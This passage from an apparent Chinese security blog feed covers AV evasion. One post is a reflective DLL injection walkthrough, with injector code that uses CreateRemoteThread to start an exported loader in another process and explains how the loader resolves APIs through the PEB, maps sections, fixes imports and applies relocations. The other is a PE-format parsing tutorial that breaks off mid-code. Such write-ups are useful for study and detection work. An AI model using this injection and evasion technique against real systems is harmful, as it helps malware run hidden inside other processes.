class="string">&quot;loader&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (loaderFuncAddr == <span class="number">0</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Get Export Function Error\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPTHREAD_START_ROUTINE lpReflectiveLoader = <span class="built_in">reinterpret_cast</span>&lt;LPTHREAD_START_ROUTINE&gt;(</span><br><span class="line">    <span class="built_in">reinterpret_cast</span>&lt;ULONG_PTR&gt;(pBase) + loaderFuncAddr</span><br><span class="line">    );</span><br><span class="line">   </span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">1024</span> * <span class="number">1024</span>, lpReflectiveLoader, pBase, (DWORD)<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == INVALID_HANDLE_VALUE || hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Create Thread Failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">500</span>);</span><br><span class="line">   </span><br><span class="line"><span class="keyword">delete</span>[] buffer;</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br></pre></td></tr></table></figure></li></ol><p>这里我是用 <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 的DLL进行测试，函数名为<code>ReflectiveLoader</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151719965.png" alt="image-20250103214642081" /></p><h2 id="关于peb"><a class="markdownIt-Anchor" href="#关于peb"></a> 关于PEB</h2><p>PEB：process environment block，处理环境块。可以参考：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">  BYTE                          BeingDebugged;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">  PPEB_LDR_DATA                 Ldr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure><ul><li><code>BeingDebugged</code>：当前是否被调试，反调试和反反调试常用</li><li><code>Ldr</code>：该结构包含有关进程已加载模块的信息</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span></span><br><span class="line">&#123;</span><br><span class="line">   DWORD dwLength;</span><br><span class="line">   DWORD dwInitialized;</span><br><span class="line">   LPVOID lpSsHandle;</span><br><span class="line">   LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">   LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">   LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">   LPVOID lpEntryInProgress;</span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><p>当程序每加载一个dll的时候，就会添加到<code>InMemoryOrderModuleList</code>中（三个<code>LIST_ENTRY</code>都会添加），<code>LIST_ENTRY</code>可以被解析为<code>LDR_DATA_TABLE_ENTRY</code>，因为数据间隔对的上…所以很抽象</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line"><span class="comment">//...   </span></span><br><span class="line">    PVOID DllBase;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><p>通过<code>FullDllName</code>可以得到当前dll的完整名称（带有路径），同时<code>DllBase</code>指向该dll的基地址（即加入到内存中的其实地址）</p><h2 id="dll编写"><a class="markdownIt-Anchor" href="#dll编写"></a> DLL编写</h2><p>首先就是loader函数，由于我们是在PE文件没有完成映射到内存时进行调用的，那么这段函数本质上和shellcode一样是一段地址无关代码。我们应该明确这段函数能执行以下任务：</p><ul><li>获得当前内存地址，方便后续解析PE文件</li><li>从<code>peb-&gt;ldr</code>获得相关函数，如<code>GetProcAddress</code>、<code>VirtualAlloc</code>、<code>Loadlibrary</code>等</li><li>解析PE文件得到完成映射后的大小并<code>VirtualAlloc</code>分配内存</li><li>完成Section段的映射</li><li>遍历导入表，使用<code>Loadlibrary</code>加载本dll所需要的各种函数</li><li>处理重定位</li><li>获得PE文件中<code>AddressOfEntryPoint</code>完成映射后的地址，然后跳转执行</li></ul><p>整个过程也是非常枯燥的，以<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 举例</p><ol><li><p>获得当前内存地址，方便后续解析PE文件。首先我们要得到当前PE文件的起始部分， 项目是通过<code>#pragma intrinsic</code>返回函数调用的返回地址，然后判断DOS头和NT头是否匹配来逐步调整，得到PE文件起始地址<code>fileBase</code>。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151727369.png" alt="image-20250105153732219" /></p></li><li><p>从<code>peb-&gt;ldr</code>获得相关函数。项目为了做到良好的兼容性使用的是<code>__readgsqword</code>和<code>_MoveFromCoprocessor</code>（ARM），函数的作用是从相对于 GS 段开头的偏移量指定的位置读取内存，比如在GS偏移为0x60的位置就是<code>PEB</code>存放的位置，通过遍历PEB中的LDR可以找到所有被加载的dll的相关信息，甚至是在内存中未被映射的PE文件，例如：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151733174.png" alt="image-20250105154150671" /></p><p>项目的这一步做的过程是差不多的，</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151737533.png" alt="image-20250105154538122" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151741450.png" alt="image-20250105154515644" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151745741.png" alt="image-20250105155234308" /></p><p>通过解析<code>kernel32.dll</code>，<code>ntdll.dll</code>的在内存中PE文件，计算出<code>LoadLibraryA</code>，<code>GetProAddress</code>，<code>VritualAlloc</code>，<code>NtFlushInstructionCache</code>三个函数在内存中的位置，便于后续调用。这里的<code>NtFlushInstructionCache</code>函数，用于刷新指定进程的指令缓存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">NtFlushInstructionCache</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T RegionSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>如果是在用户层使用的话是封装在<code>kernel32.dll</code>的<code>FlushInstructionCache</code>中的，不过直接调用可以避免一些不必要的“检查”</p></li><li><p>完成映射。现在我们得到了当前dll的PE文件起始位置，可以通过NT头中<code>OptionalHeader</code>的<code>SizeOfImage</code>得到完成映射所需要的空间大小，然后用步骤2中找到的<code>VirtualAlloc</code>申请空间，得到内存映射的起始地址<code>memBase</code>。然后先把DOS头和NT头复制过去，当然头的大小也是由<code>OptionalHeader</code>的<code>SizeOfHeaders</code>可以得到的</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151750633.png" alt="image-20250105155757072" /></p></li><li><p>完成Section段的映射</p><p>这里就不得不复习Section头的结构体了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line"> &#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>完成映射的首要问题就是：从哪里，到哪里，走多少。对应的就是从<code>fileBase</code>+<code>PointerToRawData</code>到<code>memBase</code>+<code>VirtualAddress</code>，复制<code>SizeOfRawData</code>大小</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151755783.png" alt="image-20250105160856920" /></p></li><li><p>遍历导入表。为了便于分析再次展示<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;         </span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp; </span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"> <span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><ul><li><code>OriginalFirstThunk</code>：导入名称表的RVA地址</li><li><code>Name</code>：DLL（映像文件）名称</li><li><code>FirstThunk</code>：导入地址表的RVA地址</li></ul><p>根据之前我们对PE文件格式的分析，我们首先得到的是DLL的文件名，这时候便可用之前找到的<code>LoadLibraryA</code>去加载这些<strong>我们DLL需要的DLL</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151801023.png" alt="image-20250105164438130" /></p><p>接着很自然的想到使用<code>GetProAddress</code>去加载这些函数。具体过程是从<code>FirstThunk</code>中获得<code>IMAGE_IMPORT_BY_NAME </code>，得到函数名称后使用<code>GetProAddress</code>得到函数地址，最后存储到<code>fileBase</code>+<code>PIMAGE_IMPORT_DESCRIPTOR.FirstThunk</code>上。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151804670.png" alt="image-20250105171719814" /></p><p>项目这里对于其他从<code>OriginalFirstThunk</code>开始的情况进行了解析，但是核心思路是一致的。</p></li><li><p>处理重定位。这里有之前PE文件没有说的<code>PIMAGE_BASE_RELOCATION</code>（主要是之前的例子是EXE）</p><p>为什么DLL需要重定位？每个DLL最初被设计时，编译器会为其分配一个<strong>首选加载地址</strong>（Preferred Base Address），这通常是一个固定的虚拟内存地址。当多个DLL被加载到同一个进程的地址空间时，如果多个DLL的首选加载地址发生冲突（即两个DLL都希望加载到同一个内存地址），<strong>操作系统无法直接将它们加载到相同的地址</strong>，为了避免这种冲突，操作系统会将其中一个或多个DLL加载到其他地址，这就需要对代码中的绝对地址进行<strong>重定位</strong>。</p><p>他保存在NT头的<code>OptionalHeader.DataDirectory</code>中，结构体如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@[comment(&quot;MVI_tracked&quot;)]</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_BASE_RELOCATION</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><ul><li><code>VirtualAddress</code>：待修正的数据的起始RVA</li><li><code>SizeOfBlock</code>：要修正的区块数目</li></ul><p>在PE格式中一个<code>IMAGE_BASE_RELOCATION</code>数组展现的，这也方便我们进行遍历，最后一个全部成员变量都为0，所以计算要重定位的区块数目的时候记得**-1**。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151810484.png" alt="image-20250105173117037" /></p><p>如何进行修正？<code>PIMAGE_BASE_RELOCATION</code>有一个隐藏的成员<code>TypeOffset</code>，可以通过<code>IMAGE_BASE_RELOCATION+ sizeof(IMAGE_BASE_RELOCATION)</code>找到，可以被解析为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">WORDoffset:<span class="number">12</span>;</span><br><span class="line">WORDtype:<span class="number">4</span>;</span><br><span class="line">&#125; IMAGE_RELOC, *PIMAGE_RELOC;</span><br></pre></td></tr></table></figure><p>其中重定位的类型主要是构架的不同导致的，如32位和64位</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Based relocation types.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_ABSOLUTE              0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGH                  1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_LOW                   2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGHLOW               3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGHADJ               4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_5    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_RESERVED              6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_7    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_8    8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_9    9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_DIR64                 10</span></span><br></pre></td></tr></table></figure><p>在NT头的可选头(OptionalHeader)中有<code>ImageBase</code>，他是dll加载到内存中的第一个字节的首选地址。那么所有待重定位的数据都是根据这个值相对偏移，比如<code>ImageBase=0x1000</code>，现在有个数据默认是在<code>ImageBase</code>偏移的<code>0x10</code>，即理想中的<code>0x1010</code>的位置，文件中的记录就是<code>0x1010</code>；但是现在<code>ImageBase</code>变为了<code>0x2000</code>，那么重定位的位置就是<code>0x2010</code>，由此得到公式：<code>newData = oldData-ImageBase+newMemoryAddress</code>。</p><p><strong>重定位的方式</strong>就是在原来的<code>VirtualAddress</code>+<code>IMAGE_RELOC.offset</code>地址中的值加上<code>memBase-ImageBase</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151816169.png" alt="image-20250105175336157" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151820285.png" alt="image-20250105173759085" /></p></li><li><p>获得PE文件中<code>AddressOfEntryPoint</code>完成映射后的地址，然后跳转执行。这几乎是最简单的一步了，直接在NT头的可选头(OptionalHeader)中的<code>AddressOfEntryPoint</code>可以得到，这也是PE文件格式分析中强调过的，就是得算一下偏移；最后刷新指令集缓存（可以忽略，但是会增大dll调用失败概率），跳转到程序入口点<code>AddressOfEntryPoint</code>执行（DLL的就为<code>DllMain</code>了）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151824472.png" alt="image-20250105183441641" /></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A&quot;&gt;https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="bypass" scheme="https://joe1sn.eu.org/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】PE文件格式解析</title>
    <link href="https://joe1sn.eu.org/2024/12/01/pe_format/"/>
    <id>https://joe1sn.eu.org/2024/12/01/pe_format/</id>
    <published>2024-12-01T06:50:28.000Z</published>
    <updated>2025-02-27T07:21:01.427Z</updated>
    
    <content type="html"><![CDATA[<p>公众号：<a href="https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ">https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="pe文件格式解析"><a class="markdownIt-Anchor" href="#pe文件格式解析"></a> PE文件格式解析</h1><p>假如说我们要自己写一个exe文件的加载器，或者你曾好奇过反汇编软件的原理，这就需要对exe对应的PE(Portable Executable)文件格式加以理解。这里以windows10中自带的notepad.exe进行讲解。</p><p>​这里：<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format">https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format</a><br />是微软官方对PE格式的官方文档，读者可自行了解。</p><h2 id="如何确定是一个pe文件-dos头"><a class="markdownIt-Anchor" href="#如何确定是一个pe文件-dos头"></a> 如何确定是一个PE文件-DOS头</h2><p>对于一个PE文件，首先是他的文件头，也叫DOS 头，结构体定义如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      // DOS .EXE header</span><br><span class="line">    WORD   e_magic;                     // Magic number</span><br><span class="line">//....</span><br><span class="line">    LONG   e_lfanew;                    // File address of new exe header</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><ul><li><code>e_magic</code>：魔数，如果为<code>MZ</code>这个值说明DOS头正确</li><li><code>e_lfanew</code>：指向下一个头，即<code>NT</code>头的位置，计算方式：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>T</mi><mi mathvariant="normal">_</mi><mi>H</mi><mi>E</mi><mi>A</mi><mi>D</mi><mi>E</mi><mi>R</mi><mo>=</mo><mi>F</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>S</mi><mi>t</mi><mi>a</mi><mi>r</mi><mi>t</mi><mo>+</mo><mi>e</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>f</mi><mi>a</mi><mi>n</mi><mi>e</mi><mi>w</mi></mrow><annotation encoding="application/x-tex">NT\_HEADER = FileStart+e\_lfanew</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathnormal">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span></li></ul><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103095435314.png" alt="image-20250103095435314" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> filePath = <span class="string">&quot;notepad.exe&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::ifstream <span class="title function_">inputFile</span><span class="params">(filePath, <span class="built_in">std</span>::ios::in | <span class="built_in">std</span>::ios::binary)</span>;</span><br><span class="line"><span class="keyword">if</span> (!inputFile.is_open()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;cant open: &quot;</span> &lt;&lt; filePath &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">ostringstream</span> peFileString;</span><br><span class="line">peFileString &lt;&lt; inputFile.rdbuf();</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> fileContent = peFileString.str();</span><br><span class="line">inputFile.close();</span><br><span class="line"></span><br><span class="line">IMAGE_DOS_HEADER* dosHeader = \</span><br><span class="line">    (PIMAGE_DOS_HEADER)(DWORD64)(&amp;fileContent[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::hex;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;PE e_magic  : 0x&quot;</span> &lt;&lt; dosHeader-&gt;e_magic &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;PE e_lfanew : 0x&quot;</span> &lt;&lt; dosHeader-&gt;e_lfanew &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="如何判断程序位数找到代码段等"><a class="markdownIt-Anchor" href="#如何判断程序位数找到代码段等"></a> 如何判断程序位数,找到代码段等</h2><p>上面说到我们通过<code>e_lfanew</code>找到了<code>NT Header</code>，这里我们先假设他是一个64位程序的PE文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">    DWORD Signature;<span class="comment">//标签，说明这是NT头</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;<span class="comment">//文件头,重要</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;<span class="comment">//可选项头</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure><p>这里主要功能是通过<code>FileHeader</code>来实现的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><h3 id="判断程序位数-nt头"><a class="markdownIt-Anchor" href="#判断程序位数-nt头"></a> 判断程序位数-NT头</h3><p>首先，使用<code>IMAGE_FILE_HEADER.Machine</code>可以很轻松的判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 